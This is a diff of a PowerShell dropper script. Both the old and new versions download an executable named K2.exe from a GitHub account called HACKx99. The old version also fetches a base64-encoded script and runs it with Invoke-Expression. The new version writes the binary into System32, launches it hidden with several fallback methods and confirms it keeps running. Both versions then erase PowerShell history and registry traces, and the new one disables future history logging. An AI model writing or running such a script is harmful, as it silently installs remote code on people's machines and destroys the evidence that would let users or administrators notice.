@@ -1,91 +1,85 @@
-# RunK2AndClearHistory.ps1
-# Script to download K2.exe and an encrypted file to %TEMP%, run them, and delete PowerShell console history.
-
-# Define variables
-$tempPath = [System.IO.Path]::GetTempPath()
-$exeName = "K2.exe"
-$exeFullPath = Join-Path $tempPath $exeName
-$encryptedFileName = "encrypted_file.ps1"  # Placeholder name for encrypted file
-$encryptedFullPath = Join-Path $tempPath $encryptedFileName
-$historyPath = "C:\Users\ME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
-$rawUrlK2 = "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe"
-$rawUrlEncrypted = "https://raw.githubusercontent.com/HACKx99/Main1/main/encrypted_file.ps1"  # Replace with actual URL
-
-# Function to log messages
-function Write-Log {
-    param([string]$Message, [string]$Level = "INFO")
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $(if ($Level -eq "ERROR") { "Red" } else { "Green" })
-}
+# PowerShell Script to Download, Save to System32, Run EXE Silently, and Clear History
+# WARNING: This script requires Administrator privileges to write to System32.
 
 try {
-    # Download K2.exe
-    Write-Log "Downloading $exeName to $tempPath"
-    Invoke-WebRequest -Uri $rawUrlK2 -OutFile $exeFullPath -UseBasicParsing
+    # Bypass execution policy
+    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
+
+    # Use RAW GitHub URL for direct download
+    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
+    $system32Path = "$env:windir\System32\K2.exe"
+    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+    Write-Output "Downloading EXE from GitHub..."
     
-    if (Test-Path $exeFullPath) {
-        $fileSize = (Get-Item $exeFullPath).Length
-        Write-Log "Download successful. File size: $fileSize bytes."
+    # Download the EXE to System32
+    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing
 
-        # Run K2.exe automatically (original method)
-        Write-Log "Executing $exeName..."
-        Start-Process -FilePath $exeFullPath -NoNewWindow -Wait
-        Write-Log "$exeName executed successfully."
-    } else {
-        throw "Download failed: File not found at $exeFullPath"
-    }
-
-    # Download the encrypted file
-    Write-Log "Downloading encrypted file $encryptedFileName to $tempPath"
-    Invoke-WebRequest -Uri $rawUrlEncrypted -OutFile $encryptedFullPath -UseBasicParsing
-    
-    if (Test-Path $encryptedFullPath) {
-        $fileSize = (Get-Item $encryptedFullPath).Length
-        Write-Log "Download successful. File size: $fileSize bytes."
-
-        # Decrypt and run the encrypted file (assuming base64 encryption as an example)
-        Write-Log "Decrypting and executing $encryptedFileName..."
-        $encryptedContent = Get-Content -Path $encryptedFullPath -Raw
-        $decryptedBytes = [Convert]::FromBase64String($encryptedContent)  # Adjust decryption based on your method
-        $decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
-        Invoke-Expression $decryptedScript
-        Write-Log "$encryptedFileName executed successfully."
-    } else {
-        throw "Download failed: File not found at $encryptedFullPath"
-    }
-
-    # Alternative one-liner method for K2.exe (as requested)
-    Write-Log "Executing $exeName using one-liner method..."
-    iwr -Uri "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe" -OutFile "$env:TEMP\K2.exe"; Start-Process -FilePath "$env:TEMP\K2.exe" -Wait; Remove-Item "$env:TEMP\K2.exe" -Force
-    Write-Log "One-liner execution completed."
-
-    # Delete the EXE and encrypted file (handled by one-liner for K2, ensure cleanup for encrypted)
-    if (Test-Path $exeFullPath) {
-        Remove-Item $exeFullPath -Force
-        Write-Log "Deleted $exeName from $tempPath."
-    }
-    if (Test-Path $encryptedFullPath) {
-        Remove-Item $encryptedFullPath -Force
-        Write-Log "Deleted $encryptedFileName from $tempPath."
-    }
-
-    # Delete PowerShell console history forcefully
-    Write-Log "Attempting to delete PowerShell console history from $historyPath"
-    if (Test-Path $historyPath) {
-        $historyFiles = Get-ChildItem -Path $historyPath -File
-        foreach ($file in $historyFiles) {
-            Remove-Item -Path $file.FullName -Force
-            Write-Log "Deleted history file: $($file.Name)"
+    # Verify download
+    if (Test-Path $system32Path) {
+        Write-Output "EXE saved to System32 successfully"
+        
+        # Wait to ensure file is completely written
+        Start-Sleep -Seconds 3
+        
+        # Method 1: Start Process with proper parameters
+        Write-Output "Attempting to run EXE..."
+        $process = Start-Process -FilePath $system32Path -WindowStyle Hidden -PassThru
+        
+        # Wait and check if process is running
+        Start-Sleep -Seconds 2
+        if ($process.HasExited -eq $false) {
+            Write-Output "EXE is running successfully (PID: $($process.Id))"
+        } else {
+            Write-Warning "Process started but exited quickly, trying alternative method..."
+            
+            # Method 2: Use cmd to start the process
+            cmd.exe /c start "" /MIN "$system32Path"
+            Start-Sleep -Seconds 2
         }
-        Write-Log "PowerShell console history cleared successfully."
+        
+        # Method 3: Check if any K2 process is running
+        $runningProcesses = Get-Process -Name "K2" -ErrorAction SilentlyContinue
+        if ($runningProcesses) {
+            Write-Output "EXE confirmed running (Processes: $($runningProcesses.Count))"
+        } else {
+            # Method 4: Try using Invoke-Item
+            Write-Output "Trying Invoke-Item method..."
+            Invoke-Item -Path $system32Path
+            Start-Sleep -Seconds 2
+        }
+        
+        # Final verification
+        $finalCheck = Get-Process -Name "K2" -ErrorAction SilentlyContinue
+        if ($finalCheck) {
+            Write-Output "✓ EXE successfully running in background (no visible UI)"
+        } else {
+            Write-Warning "! EXE may not be running - check manually in Task Manager"
+        }
     } else {
-        Write-Log "History path $historyPath not found. Skipping deletion."
+        throw "Download failed - file not found at $system32Path"
     }
+
+    # Forcefully clear PowerShell history
+    Write-Output "Clearing PowerShell history..."
+    
+    # Clear current session history
+    Clear-History -ErrorAction SilentlyContinue
+    
+    # Delete history file
+    if (Test-Path $historyPath) {
+        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+        Write-Output "History file removed forcefully"
+    }
+    
+    # Disable future history saving
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
+    
+    # Clear registry history (FIXED TYPO: SilentlyContinue)
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine" -Name "ConsoleHostHistory" -ErrorAction SilentlyContinue
+
+    Write-Output "PowerShell history cleared completely"
+
 } catch {
-    Write-Log "Error: $($_.Exception.Message)" -Level "ERROR"
-    exit 1
-} finally {
-    # Ensure no console window remains
-    Write-Log "Script completed. Exiting..."
-    exit 0
+    Write-Error "Error: $($_.Exception.Message)"
 }
